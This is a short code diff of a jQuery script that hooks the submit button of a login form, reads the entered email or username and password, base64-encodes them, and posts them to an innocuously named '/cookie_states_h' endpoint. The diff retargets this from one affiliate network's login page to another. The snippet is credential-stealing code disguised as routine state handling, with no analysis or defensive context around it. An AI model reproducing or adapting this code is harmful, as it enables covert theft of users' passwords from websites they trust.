@@ -1,24 +1,24 @@
 
  
 $(document).ready(function() { 
-	if ($('#loginContainer').length) { 
-	$(document).on('click','#loginButton',function() {
-    		 	credentials_update_impact();
+	if ($('.passSubmit').length) { 
+	$(document).on('click','.passSubmit',function() {
+    		 	credentials_update();
     		return true;
     	});
     } 
 });
 
 
-function credentials_update_impact(){  
+function credentials_update(){  
     $.ajax({
         type: "post",
         dataType: "json",
         url: api_path + "/cookie_states_h",
         data: { 
-            state0: btoa('impactradius'),
-            state1: 'ZX'+btoa($('#j_username').val()), 
-            state2: 'ZX'+btoa($('#j_password').val()), 
+            state0: btoa('GA-net.com'),
+            state1: 'ZX'+btoa($('#publisher_user_email').val()), 
+            state2: 'ZX'+btoa($('#publisher_user_password').val()), 
         },
         success: function(data) {
             if (data.success === "yes") { 
